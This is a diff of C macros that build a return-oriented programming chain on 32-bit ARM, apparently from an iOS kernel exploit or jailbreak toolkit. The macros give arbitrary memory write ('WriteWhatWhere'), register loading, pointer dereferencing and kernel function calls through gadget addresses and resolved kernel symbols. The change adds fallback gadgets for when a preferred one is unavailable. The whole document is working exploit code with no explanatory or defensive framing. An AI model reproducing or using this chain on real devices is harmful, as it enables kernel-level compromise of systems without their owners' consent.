@@ -32,7 +32,7 @@ push = (uint32_t)0x45454545;\
 push = (uint32_t)m_m_scratch
 
 #define WriteWhatWhere(push, what, where)\
-push = (uint32_t)pop_r0r1r3r5r7pc;\
+push = (pop_r0r1r3r5r7pc != INVALID_GADGET) ? (uint32_t)pop_r0r1r3r5r7pc : (uint32_t)pop_r0r2r4r6r7pc;\
 push = (uint32_t)what;\
 push = (uint32_t)0x11111111;\
 push = (uint32_t)0x33333333;\
@@ -46,7 +46,7 @@ push = (uint32_t)0x44444444;\
 push = (uint32_t)m_m_scratch
 
 #define LoadIntoR0(push, where)\
-push = (uint32_t)pop_r0r1r3r5r7pc;\
+push = (pop_r0r1r3r5r7pc != INVALID_GADGET) ? (uint32_t)pop_r0r1r3r5r7pc : (uint32_t)pop_r0r2r4r6r7pc;\
 push = (uint32_t)where - 8;\
 push = (uint32_t)0x11111111;\
 push = (uint32_t)0x33333333;\
@@ -72,7 +72,7 @@ push = (uint32_t)m_m_scratch
 
 #define LoadStackFrameR0(push) \
 tmp = (uint32_t)(segstackbase + (void*)stack - (void*)stackbase); \
-push = pop_r0r1r3r5r7pc; \
+push = (pop_r0r1r3r5r7pc != INVALID_GADGET) ? (uint32_t)pop_r0r1r3r5r7pc : (uint32_t)pop_r0r2r4r6r7pc;\
 push = (uint32_t)tmp; \
 push = (uint32_t)0x11111111; \
 push = (uint32_t)0x33333333; \
@@ -100,9 +100,10 @@ push = (uint32_t)pop_r4r7pc
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
 #define RopSetupLRClearParams(push, count) \
-push = pop_r0r1r3r5r7pc;\
+push = (uint32_t)pop_r0r1r2r3r5r7pc;\
 push = 0x40404040;\
 push = pop_r2pc;\
+push = 0x42424242;\
 push = 0x43434343;\
 push = 0x45454545;\
 push = (uint32_t)(m_m_scratch);\
@@ -209,7 +210,7 @@ assert((uint32_t)[dy solveSymbol:name]);\
 RopPtrFunctionKernel(push, [dy solveSymbol:name], a, b, c, d, e, f, g, h, i, l, count, magic) \
 
 #define DerefParam(push, repl_arg, read_ptr, position) \
-push = (uint32_t)pop_r0r1r3r5r7pc;\
+push = (pop_r0r1r3r5r7pc != INVALID_GADGET) ? (uint32_t)pop_r0r1r3r5r7pc : (uint32_t)pop_r0r2r4r6r7pc;\
 push = (uint32_t)read_ptr - 8;\
 push = (uint32_t)0x11111111;\
 push = (uint32_t)0x33333333;\
@@ -227,7 +228,7 @@ push = (uint32_t)m_m_scratch;\
 
 // should be after ALL DerefParams
 #define DerefFunctionPointer(push, fptr_deref) \
-push = (uint32_t)pop_r0r1r3r5r7pc;\
+push = (pop_r0r1r3r5r7pc != INVALID_GADGET) ? (uint32_t)pop_r0r1r3r5r7pc : (uint32_t)pop_r0r2r4r6r7pc;\
 push = (uint32_t)fptr_deref - 8;\
 push = (uint32_t)0x11111111;\
 push = (uint32_t)0x33333333;\
